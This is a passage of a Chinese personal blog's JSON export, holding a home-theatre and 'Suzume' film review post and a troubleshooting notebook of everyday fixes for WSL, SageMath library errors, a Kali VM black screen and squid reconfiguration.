带上车。</li>\n<li>铃芽房间里的《看护师》给了两次镜头，第一次是草太到房间里的时候，第二次是结尾，表明铃芽也继承了母亲的职业。</li>\n<li>草太坠落时的背景是燃烧的常世。</li>\n</ul>\n","excerpt":"<p>越来越不务正业乐！</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>初三时基本将宫崎骏和新海诚的电影都看了一遍，比较喜欢日本动画的风格，这次的《铃芽之旅》终于是在电影院看了，为了对比不同影院的观影效果，特意去了五次，然后，就破产了。</p>\n<h2 id=\"宿舍影院搭建\"><a href=\"#宿舍影院搭建\" class=\"headerlink\" title=\"宿舍影院搭建\"></a>宿舍影院搭建</h2><p>之前用的显示屏是 16:9 27 英寸屏，但现在很多电影都是宽幕，在宿舍用投影仪也不现实 <del>（其实也不是完全不现实）</del>，所以就买了一个 21:9 34 英寸的带鱼屏。因为对床开着灯会导致屏幕反光，就买了个桌帘挡着，效果就很好了。<br>音响用的是漫步者的 R501BT，5.1声道，759RMB 入的，看到上一年双十一最低价有到 600，但本着早买早享受的原则，就不等了。<br>桌子左边是衣柜，隔板会增强回音，导致声场不平衡，就买了块 50*50 的吸音棉，回音基本消了，还顺便起到吸光的效果。<br>后面的两个音箱架高，可以感觉到天上的雨声。</p>\n<h3 id=\"显示屏\"><a href=\"#显示屏\" class=\"headerlink\" title=\"显示屏\"></a>显示屏</h3><p>主要看分辨率、色深、色域、色准、防蓝光、亮度、对比度、刷新率、响应时间、HDR、曲率。</p>\n<ul>\n<li><p>分辨率<br>这个其实没啥好讲的，越高越好，不追求带鱼屏的话直接 4K，比 1080P 和 2K(1440P) 清晰得多。</p>\n</li>\n<li><p>色深<br>色深会影响颜色过渡的平滑度，一般都是 8 位，很多 10 位也是 8 位抖出来的，原生 10 位价格很高，一般人也看不出来。</p>\n</li>\n<li><p>色域<br>这个比较复杂，慢慢完善。<br>首先有个东西叫色彩马蹄图，表示人眼能分辨的全部色彩，然后显示屏的色域就是这个图的子集，一般呈三角形，常见的有 NTSC，sRGB，DCI-P3，BT.2020，一般广告宣传标的都是容积率，也就是产品色域面积是标准色域的多少，但是注意这个不是覆盖率，100% sRGB 色域容积不一定 100% 覆盖 sRGB 色域。识别方法也很简单，没标是覆盖率一律当作容积处理，超过 100% 的也必定不是覆盖率。</p>\n</li>\n<li><p>色准<br>看 $\\Delta$E，越小越好，一般 2 以内就可以了，但是这个参数一般是指出厂的<strong>平均值</strong>，具体在自己收到的机子是不一定，看自己运气，不过一般人看不出色偏。而且我发现我眼镜是防蓝光的，戴上看屏幕色温明显升高，有空还是去配个普通镜片吧。<br>至于校色，一般没必要，几百的红蜘蛛测普通屏幕也测不准，正经校色都要十万往上的设备。</p>\n</li>\n<li><p>防蓝光<br>优先<strong>硬件级</strong>防蓝光，没写就是软件级。</p>\n</li>\n<li><p>亮度<br>这个高当然好，但比较看个人需求。我这个显示屏是 350 nit，宿舍里没有阳光直射，开 70% 都绰绰有余。</p>\n</li>\n<li><p>对比度<br>就是最白和最黑时亮度的比值，一般 VA 屏的对比度要高点，如果不打游戏就直接 VA 屏，对比度会比较高，4000:1 以上比较好了。主要还是看<strong>原生对比度</strong>，所谓动态对比度就是通过调整背光亮度来实现的，我直接关掉背光，那动态对比度就是无穷大了，参考价值不大。</p>\n</li>\n<li><p>刷新率<br>这个有点曾经沧海难为水的，如果用过了高刷就回不来了，就算不打游戏，窗口的最大最小化也能看出来高刷很自然而低刷有明显卡顿。如果是办公的话 144 Hz 就行了，再往上也体现不出来。</p>\n</li>\n<li><p>响应时间<br>游戏方面比较需要这个，办公的话就不用太在意。一般选 IPS 屏响应时间会好点，但是 IPS 屏一般漏光会比较严重，意思就是就算放一张全黑的图片显示屏的边缘也会有光，这个是 LED 屏的通病，要么买会烧屏的 OLED，富哥可以考虑 Micro LED。</p>\n</li>\n<li><p>HDR<br>HDR10 基本没啥效果的，折腾不好搞成负优化了还不如 SDR，建议不要管。</p>\n</li>\n<li><p>曲率<br>一般大屏曲一点是好的，有环绕感，边上也不会太远产生虚焦。不信你去影院看，银幕也是弧面的。</p>\n</li>\n</ul>\n<h3 id=\"投影仪\"><a href=\"#投影仪\" class=\"headerlink\" title=\"投影仪\"></a>投影仪</h3><p>虽然现在的体验已经相当不错了，但是谁能拒绝巨幕呢？</p>\n<ul>\n<li><p>光源<br>传统光源是灯炮，然后是 LED，然后是激光光源。<br>推荐三色激光，色彩、对比度、亮度都能打，某品牌的 LED 还在吹，不要上当。<br>目前的三色激光只有散斑和色散的问题，但是从我个人体验来说，选择最优的解决方案后，观影的时候是完全感觉不出来的，完全没有某品牌黑到不能用的程度。<br>光峰的 ALPD5.0 年底应该能出新机，说是能解决散斑和色散的问题，这样三色就是完美技术了，期待一手。</p>\n</li>\n<li><p>显像芯片<br>DMD，LCOS，LCD。</p>\n</li>\n</ul>\n<h3 id=\"音响\"><a href=\"#音响\" class=\"headerlink\" title=\"音响\"></a>音响</h3><p>2.1 就是左右音箱加一个低音炮，5.1 就是左右音箱加一个中置音箱加一个低音炮加两个环绕音箱，7.1 不是富哥又没需求的话不建议买，因为音源也少，用不着。<br>如果会产生驻波可以考虑加低频陷阱或者用双炮，当然你如果像我一样也在宿舍用就别花那个劲做声学处理了。</p>\n<h2 id=\"影院对比\"><a href=\"#影院对比\" class=\"headerlink\" title=\"影院对比\"></a>影院对比</h2><ol>\n<li>数字 IMAX<br>头两次都是在金逸影城（深圳光明区大仟里店）看的，基本只顾着看剧情了，所以观影效果基本忘了。第三次在 CINESKY 新天影院（深圳龙华区壹方天地店），只记录这个。<br>体验：第一反应就是银幕很大（但是走近看也不会明显看到像素点，如果《铃芽之旅》是 4K 片源的话那我觉得现在 8K 电视完全就是没必要了），工作人员服务也好，指引招呼都很热情，里面的声学设计也很不错，吸音棉沟壑多，错落有致，保持美观的同时总体声场很好。唯一缺点：票有点贵。</li>\n<li>二代 IMAX<br>影院：万达影院（深圳龙岗万达广场 IMAX 激光店）<br>体验：去的是早上 10 点的场，检票员都还没来上班，理论上可以随便进，进到里面也没人，算是我包场了，乐。银幕较小，亮度与数字 IMAX 相比看不出有明显区别，12.0 声道，但是天空声道听不出声音，基本可以判断《铃芽之旅》是 5.0 声道片源。</li>\n<li>杜比影院<br>影院：万象影城（深圳罗湖万象城店）<br>体验：首先这是我第一次去万象城，对我这种乡巴佬来说非常不适应，全是卖奢侈品的，几乎所有店名都是英文，一家吃的也没，最后实在赶时间，花 38 买了一桶爆米花，纯纯大冤种。影院排场过密，开场前 10 分钟才给进。杜比视界的对比度确实高，黑的地方很黑，银幕边缘基本不会像 IMAX 厅有类似显示屏漏光的现象，亮度对比 IMAX 也稍有提高。但是影院似乎把音量调小了，《铃芽之旅》关门的情节中，上锁的声音最后会有一声极为高频的清鸣，在 IMAX 厅感觉非常明显，但在这个厅没有，给人的感觉就没那么燃，隔音也没做好，时不时会传来隔壁影院的低音振动。此外，我坐的位置观影时能看到左右两边有非常亮的安全出口绿光，十分影响观影体验，如果能往前坐一排的话应该不会有这个问题。</li>\n</ol>\n<p>总结：2D 电影基本都可以在数字 IMAX 厅或杜比影院看，激光 IMAX 应该只有在 3D 电影才会体现出亮度优势。</p>\n<h2 id=\"浅评《铃芽之旅》\"><a href=\"#浅评《铃芽之旅》\" class=\"headerlink\" title=\"浅评《铃芽之旅》\"></a>浅评《铃芽之旅》</h2><p>第一次比较认真地鉴赏电影，感觉还是挺有意思的。<br>期间也看了很多关于《铃芽之旅》的评论，很多都是不加思考的主观臆断，并不是说电影没有问题，每个人都可以有其对作品的理解和看法，但没有依据地一味批评显得十分无脑，只能说可能是短视频刷多了，遇到需要思考的东西就回避，直接贴上一个“逻辑混乱”的标签掩饰自己的懒惰。在我看来，电影和阅读理解一样，很难说一遍就能读透的，赏析时也不能光写观点而不给理由。<br>首先<strong>我觉得最不合适的就是分类在爱情片里</strong>，《铃芽之旅》的爱情线虽然勉强算是完整，但着笔确实太少，只能说能圆上，其中最大的问题在于对草太的人物刻画十分单薄，两人的独处篇幅也少。<br>其次这个电影<strong>并不是逻辑混乱的</strong>，当然也不能说逻辑十分完整。第一遍看的时候我也很懵，但后来越看越合理，许多情节都是伏笔。<br>这里给出几个我的观点，仅供参考。</p>\n<ul>\n<li><p>铃芽真的是恋爱脑吗？<br>首先我们要知道一个设定，那就是铃芽的母亲是在 311 地震中丧生的，这带给铃芽很大的打击，电影开头里，铃芽梦见她小时候在常世找妈妈，表明<strong>铃芽对母亲的逝去始终无法释怀</strong>。<br>我认为铃芽一开始带草太回家一方面是因为她跟随母亲当护士的职业操守，一方面自然是好奇。铃芽跟着草太和大臣一起上船也不难理解，椅子是她妈妈留下的遗物，总不能不管吧。</p>\n</li>\n<li><p>黄蝴蝶的含义是什么？<br>我比较赞同<strong>黄蝴蝶是铃芽母亲</strong>的说法。如果说前面只是普通的暗示，那么电影结尾铃芽看着小时候的自己，哭着说“妈妈，我该怎么办”时，黄蝴蝶围着椅子飞，给她指明方向时，就是新海诚明着说这就是铃芽妈妈了。</p>\n</li>\n<li><p>东京的要石是被谁拔出的？<br>我的猜测是<strong>大臣</strong>拔出的，作案动机我也不能十分揣测明白，但是作案时间是具备的，大臣消失了一会蚓厄就爆发了。</p>\n</li>\n</ul>\n<p>其他的小细节：</p>\n<ul>\n<li>三部曲都有人抽烟，《你的名字》是奥寺，《天气之子》是大叔，《铃芽之旅》是芹泽。</li>\n<li>游乐场的往门能进去。</li>\n<li>千果为了搭铃芽去废弃的学校，橙子都没带上车。</li>\n<li>铃芽房间里的《看护师》给了两次镜头，第一次是草太到房间里的时候，第二次是结尾，表明铃芽也继承了母亲的职业。</li>\n<li>草太坠落时的背景是燃烧的常世。</li>\n</ul>"},{"title":"日常问题小记","date":"2023-05-21T03:39:00.000Z","_content":"\n记录一下平时遇到的问题和解决方法，以备后用。\n<!--more-->\n\n## 无\n\n* WSL 运行后 CPU 占用过高\n\n  在 User 文件夹下新建一个 .wslconfig 文件，内容如下：\n\n  ```bash\n  [wsl2]\n  guiApplications=false\n  ```\n\n  后来发现好像没啥用？\n\n## Sagemath 报错\n\n### 9.5\n\n```bash\nImportError: libsingular-Singular-4.3.1.so: cannot open shared object file: No such file or directory\n```\n\n我装了 Sagemath9.5 但一直报这个错，GitHub 上也没 issue，发现是现在的 .so 版本已经到 4.3.2 了，执行下面的命令就好了：\n\n```bash\nsudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-Singular-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-Singular-4.3.1.so\nsudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-polys-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-polys-4.3.1.so\nsudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-resources-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-resources-4.3.1.so\nsudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-omalloc-4.3.2+0.9.6.so /usr/lib/x86_64-linux-gnu/libsingular-omalloc-4.3.1+0.9.6.so\nsudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-factory-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-factory-4.3.1.so\n```\n\n### 10.0\n\n重装了下系统，用 WSL 2 装了 Sagemath 10.0，直接按官方的 `mamba create -n sage sage python=3.11` 安装后，运行会报错：\n\n```bash\n$ sage\n┌────────────────────────────────────────────────────────────────────┐\n│ SageMath version 10.0, Release Date: 2023-05-20                    │\n│ Using Python 3.11.5. Type \"help()\" for help.                       │\n└────────────────────────────────────────────────────────────────────┘\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n┃ Warning: sage.all is not available; this is a limited REPL.        ┃\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\nsage:\n```\n\n而且在 python 里 `import sage.all` 也会报错：\n\n```bash\n$ python\nPython 3.11.5 (main, Sep 11 2023, 13:54:46) [GCC 11.2.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> from sage.all import *\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/all.py\", line 75, in <module>\n    from sage.misc.all       import *         # takes a while\n    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/misc/all.py\", line 72, in <module>\n    from .functional import (additive_order,\n  File \"/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/misc/functional.py\", line 26, in <module>\n    from sage.rings.complex_double import CDF\nImportError: libgsl.so.25: cannot open shared object file: No such file or directory\n>>>\n```\n\n又尝试去源码 build，失败，最后和 GPT 通力合作（我们两个真厉害），发现是环境变量的问题，执行下面的命令就好了（`xxx` 要换成你的用户名）：\n\n```bash\nexport LD_LIBRARY_PATH=/home/xxx/mambaforge/pkgs/gsl-2.7-he838d99_0/lib:$LD_LIBRARY_PATH\n```\n\n当然这样十分麻烦，每次启动 sage 环境要重新设置一次，所以可以把这个命令加到 mamba 启动时的脚本里。\n首先看看你 sage 装在哪：\n\n```bash\nmamba env list\n```\n\n然后在目录的 `etc/conda/activate.d/sage-activate.sh` 里末尾补一条 `export` 命令就好了。\n\n## 后台进程\n\n以下命令可以让程序在后台运行，避免退出终端时就断掉：\n\n```bash\nnohub <command> &\n```\n\n## VMWare 安装 Kali Linux 后启动黑屏\n\n用管理员运行cmd，输入命令 `netsh winsock reset`，重启电脑，这时能看到了，但是很卡，再关闭 3D 加速就好了。\n后来发现我操作系统勾的是 Windows，不知道有没有关系。\n\n## 改 `/etc/hosts` 后 squid 不能马上生效\n\n重载一下配置文件就好了：\n\n```bash\nsudo squid -k reconfigure\n```\n","source":"_posts/日常问题小记.md","raw":"---\ntitle: 日常问题小记\ndate: 2023-05-21 11:39:00\ntags: [计算机, 学习]\ncategories: 学习\n---\n\n记录一下平时遇到的问题和解决方法，以备后用。\n<!--more-->\n\n## 无\n\n* WSL 运行后 CPU 占用过高\n\n  在 User 文件夹下新建一个 .wslconfig 文件，内容如下：\n\n  ```bash\n  [wsl2]\n  guiApplications=false\n  ```\n\n  后来发现好像没啥用？\n\n## Sagemath 报错\n\n### 9.5\n\n```bash\nImportError: libsingular-Singular-4.3.1.so: cannot open shared object file: No such file or directory\n```\n\n我装了 Sagemath9.5 但一直报这个错，GitHub 上也没 issue，发现是现在的 .so 版本已经到 4.3.2 了，执行下面的命令就好了：\n\n```bash\nsudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-Singular-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-Singular-4.3.1.so\nsudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-polys-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-polys-4.3.1.so\nsudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-resources-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-resources-4.3.1.so\nsudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-omalloc-4.3.2+0.9.6.so /usr/lib/x86_64-linux-gnu/libsingular-omalloc-4.3.1+0.9.6.so\nsudo ln -s /usr/lib/x86_64-linux-gnu/libsingular-factory-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-factory-4.3.1.so\n```\n\n### 10.0\n\n重装了下系统，用 WSL 2 装了 Sagemath 10.0，直接按官方的 `mamba create -n sage sage python=3.11` 安装后，运行会报错：\n\n```bash\n$ sage\n┌────────────────────────────────────────────────────────────────────┐\n│ SageMath version 10.0, Release Date: 2023-05-20                    │\n│ Using Python 3.11.5. Type \"help()\" for help.                       │\n└────────────────────────────────────────────────────────────────────┘\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n┃ Warning: sage.all is not available; this is a limited REPL.        ┃\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\nsage:\n```\n\n而且在 python 里 `import sage.all` 也会报错：\n\n```bash\n$ python\nPython 3.11.5 (main, Sep 11 2023, 13:54:46) [GCC 11.2.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> from sage.all import *\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/all.py\", line 75, in <module>\n    from sage.misc.all       import *         # takes a while\n    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/misc/all.py\", line 72, in <module>\n    from .functional import (additive_order,\n  File \"/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/misc/functional.py\", line 26, in <module>\n    from sage.rings.complex_double import CDF\nImportError: libgsl.so.25: cannot open shared object file: No such file or directory\n>>>\n```\n\n又尝试去源码 build，失败，最后和 GPT 通力合作（我们两个真厉害），发现是环境变量的问题，执行下面的命令就好了（`xxx` 要换成你的用户名）：\n\n```bash\nexport LD_LIBRARY_PATH=/home/xxx/mambaforge/pkgs/gsl-2.7-he838d99_0/lib:$LD_LIBRARY_PATH\n```\n\n当然这样十分麻烦，每次启动 sage 环境要重新设置一次，所以可以把这个命令加到 mamba 启动时的脚本里。\n首先看看你 sage 装在哪：\n\n```bash\nmamba env list\n```\n\n然后在目录的 `etc/conda/activate.d/sage-activate.sh` 里末尾补一条 `export` 命令就好了。\n\n## 后台进程\n\n以下命令可以让程序在后台运行，避免退出终端时就断掉：\n\n```bash\nnohub <command> &\n```\n\n## VMWare 安装 Kali Linux 后启动黑屏\n\n用管理员运行cmd，输入命令 `netsh winsock reset`，重启电脑，这时能看到了，但是很卡，再关闭 3D 加速就好了。\n后来发现我操作系统勾的是 Windows，不知道有没有关系。\n\n## 改 `/etc/hosts` 后 squid 不能马上生效\n\n重载一下配置文件就好了：\n\n```bash\nsudo squid -k reconfigure\n```\n","slug":"日常问题小记","published":1,"updated":"2024-05-31T14:35:46.602Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zodt001t7slz7mh9f1ba","content":"<p>记录一下平时遇到的问题和解决方法，以备后用。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"无\"><a href=\"#无\" class=\"headerlink\" title=\"无\"></a>无</h2><ul>\n<li><p>WSL 运行后 CPU 占用过高</p>\n<p>在 User 文件夹下新建一个 .wslconfig 文件，内容如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[wsl2]</span><br><span class=\"line\">guiApplications=<span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n\n<p>后来发现好像没啥用？</p>\n</li>\n</ul>\n<h2 id=\"Sagemath-报错\"><a href=\"#Sagemath-报错\" class=\"headerlink\" title=\"Sagemath 报错\"></a>Sagemath 报错</h2><h3 id=\"9-5\"><a href=\"#9-5\" class=\"headerlink\" title=\"9.5\"></a>9.5</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ImportError: libsingular-Singular-4.3.1.so: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>\n\n<p>我装了 Sagemath9.5 但一直报这个错，GitHub 上也没 issue，发现是现在的 .so 版本已经到 4.3.2 了，执行下面的命令就好了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s /usr/lib/x86_64-linux-gnu/libsingular-Singular-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-Singular-4.3.1.so</span><br><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s /usr/lib/x86_64-linux-gnu/libsingular-polys-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-polys-4.3.1.so</span><br><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s /usr/lib/x86_64-linux-gnu/libsingular-resources-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-resources-4.3.1.so</span><br><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s /usr/lib/x86_64-linux-gnu/libsingular-omalloc-4.3.2+0.9.6.so /usr/lib/x86_64-linux-gnu/libsingular-omalloc-4.3.1+0.9.6.so</span><br><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s /usr/lib/x86_64-linux-gnu/libsingular-factory-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-factory-4.3.1.so</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"10-0\"><a href=\"#10-0\" class=\"headerlink\" title=\"10.0\"></a>10.0</h3><p>重装了下系统，用 WSL 2 装了 Sagemath 10.0，直接按官方的 <code>mamba create -n sage sage python=3.11</code> 安装后，运行会报错：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sage</span><br><span class=\"line\">┌────────────────────────────────────────────────────────────────────┐</span><br><span class=\"line\">│ SageMath version 10.0, Release Date: 2023-05-20                    │</span><br><span class=\"line\">│ Using Python 3.11.5. Type <span class=\"string\">&quot;help()&quot;</span> <span class=\"keyword\">for</span> <span class=\"built_in\">help</span>.                       │</span><br><span class=\"line\">└────────────────────────────────────────────────────────────────────┘</span><br><span class=\"line\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓</span><br><span class=\"line\">┃ Warning: sage.all is not available; this is a limited REPL.        ┃</span><br><span class=\"line\">┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛</span><br><span class=\"line\">sage:</span><br></pre></td></tr></table></figure>\n\n<p>而且在 python 里 <code>import sage.all</code> 也会报错：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python</span><br><span class=\"line\">Python 3.11.5 (main, Sep 11 2023, 13:54:46) [GCC 11.2.0] on linux</span><br><span class=\"line\">Type <span class=\"string\">&quot;help&quot;</span>, <span class=\"string\">&quot;copyright&quot;</span>, <span class=\"string\">&quot;credits&quot;</span> or <span class=\"string\">&quot;license&quot;</span> <span class=\"keyword\">for</span> more information.</span><br><span class=\"line\">&gt;&gt;&gt; from sage.all import *</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, line 1, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/all.py&quot;</span>, line 75, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    from sage.misc.all       import *         <span class=\"comment\"># takes a while</span></span><br><span class=\"line\">    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/misc/all.py&quot;</span>, line 72, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    from .functional import (additive_order,</span><br><span class=\"line\">  File <span class=\"string\">&quot;/home/xxx/mambaforge/envs/sage/lib/python3.11/site-packages/sage/misc/functional.py&quot;</span>, line 26, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">    from sage.rings.complex_double import CDF</span><br><span class=\"line\">ImportError: libgsl.so.25: cannot open shared object file: No such file or directory</span><br><span class=\"line\">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>\n\n<p>又尝试去源码 build，失败，最后和 GPT 通力合作（我们两个真厉害），发现是环境变量的问题，执行下面的命令就好了（<code>xxx</code> 要换成你的用户名）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> LD_LIBRARY_PATH=/home/xxx/mambaforge/pkgs/gsl-2.7-he838d99_0/lib:<span class=\"variable\">$LD_LIBRARY_PATH</span></span><br></pre></td></tr></table></figure>\n\n<p>当然这样十分麻烦，每次启动 sage 环境要重新设置一次，所以可以把这个命令加到 mamba 启动时的脚本里。<br>首先看看你 sage 装在哪：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mamba <span class=\"built_in\">env</span> list</span><br></pre></td></tr></table></figure>\n\n<p>然后在目录的 <code>etc/conda/activate.d/sage-activate.sh</code> 里末尾补一条 <code>export</code> 命令就好了。</p>\n<h2 id=\"后台进程\"><a href=\"#后台进程\" class=\"headerlink\" title=\"后台进程\"></a>后台进程</h2><p>以下命令可以让程序在后台运行，避免退出终端时就断掉：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nohub &lt;<span class=\"built_in\">command</span>&gt; &amp;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"VMWare-安装-Kali-Linux-后启动黑屏\"><a href=\"#VMWare-安装-Kali-Linux-后启动黑屏\" class=\"headerlink\" title=\"VMWare 安装 Kali Linux 后启动黑屏\"></a>VMWare 安装 Kali Linux 后启动黑屏</h2><p>用管理员运行cmd，输入命令 <code>netsh winsock reset</code>，重启电脑，这时能看到了，但是很卡，再关闭 3D 加速就好了。<br>后来发现我操作系统勾的是 Windows，不知道有没有关系。</p>\n<h2 id=\"改-etc-hosts-后-squid-不能马上生效\"><a href=\"#改-etc-hosts-后-squid-不能马上生效\" class=\"headerlink\" title=\"改 /etc/hosts 后 squid 不能马上生效\"></a>改 <code>/etc/hosts</code> 后 squid 不能马上生效</h2><p>重载一下配置文件就好了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo squid -k reconfigure</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>记录一下平时遇到的问题和解决方法，以备后用。</p>","more":"<h2 id=\"无\"><a href=\"#无\" class=\"headerlink\" title=\"无\"></a>无</h2><ul>\n<li><p>WSL 运行后 CPU 占用过高</p>\n<p>在 User 文件夹下新建一个 .wslconfig 文件，内容如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[wsl2]</span><br><span class=\"line\">guiApplications=<span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n\n<p>后来发现好像没啥用？</p>\n</li>\n</ul>\n<h2 id=\"Sagemath-报错\"><a href=\"#Sagemath-报错\" class=\"headerlink\" title=\"Sagemath 报错\"></a>Sagemath 报错</h2><h3 id=\"9-5\"><a href=\"#9-5\" class=\"headerlink\" title=\"9.5\"></a>9.5</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ImportError: libsingular-Singular-4.3.1.so: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>\n\n<p>我装了 Sagemath9.5 但一直报这个错，GitHub 上也没 issue，发现是现在的 .so 版本已经到 4.3.2 了，执行下面的命令就好了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s /usr/lib/x86_64-linux-gnu/libsingular-Singular-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-Singular-4.3.1.so</span><br><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s /usr/lib/x86_64-linux-gnu/libsingular-polys-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-polys-4.3.1.so</span><br><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s /usr/lib/x86_64-linux-gnu/libsingular-resources-4.3.2.so /usr/lib/x86_64-linux-gnu/libsingular-resources-4.3.1.so</span><br><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s /usr/lib/x86_64-linux-gnu/libsingular-omalloc-4.3.2+0.9.6.so /usr/lib/x86_64-linux-gnu/libsingular-omalloc-4.3.1+0.9.6.so</span><br><span class=\"line\">sudo <span 